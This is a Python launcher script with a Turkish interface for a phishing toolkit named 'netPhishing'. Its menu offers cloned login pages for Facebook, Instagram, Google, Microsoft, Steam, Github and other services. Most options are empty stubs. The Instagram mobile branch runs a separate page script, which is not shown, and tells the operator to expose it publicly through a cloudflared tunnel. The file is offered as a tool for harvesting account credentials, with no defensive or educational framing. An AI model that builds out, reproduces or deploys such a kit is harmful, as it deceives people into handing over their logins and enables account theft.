import os
import time
from colorama import init, Fore
import pyfiglet

def welcome_message():
    init(autoreset=True)  # renk sıfırlama otomatik olsun
    os.system('cls' if os.name == 'nt' else 'clear')

    banner = pyfiglet.figlet_format("           netPhishing")
    print(Fore.LIGHTYELLOW_EX + banner)

    print(Fore.LIGHTCYAN_EX + "by netWexe".center(80))
    print(Fore.RED + "Sürüm 1.0".center(80))
    print(Fore.GREEN + "="*80)

welcome_message()

def select_socialmedia():
    init(autoreset=True)

    welcome_message()
    print(Fore.LIGHTBLUE_EX + "Devam etmek istediğiniz sosyal medya uygulamasını seçin.".center(80))

    print(Fore.CYAN + '''
[01] Facebook     [08] Roblox
[02] Instagram    [09] Spotify
[03] Google       [10] Snapchat
[04] Microsoft    [11] Tiktok
[05] Netflix      [12] Twitch
[06] Discord      [13] Twitter
[07] Steam        [14] Github
  
[99] Bilgi        [00] Çıkış
    
    ''')

    secim = input("[-] ")

    if int(secim) == 99:
        #bilgi
        pass

    elif int(secim) == 0:
        pass

    elif int(secim) == 1:
        #facebook
        pass

    elif int(secim) == 2:
        print(Fore.LIGHTMAGENTA_EX + "Devam edeceğiniz platformu seçin. [00] Mobil - [01] PC".center(80))
        platform = input("[-] ")

        if int(platform) == 0:
            welcome_message()
            print(Fore.WHITE + "Terminalde 'cloudflared tunnel --url http://localhost:8080' komutunu çalıştırarak site url sini alabilirsiniz.")
            print("")
            os.system("python media/instagram/mobil/mobil.py")

select_socialmedia()
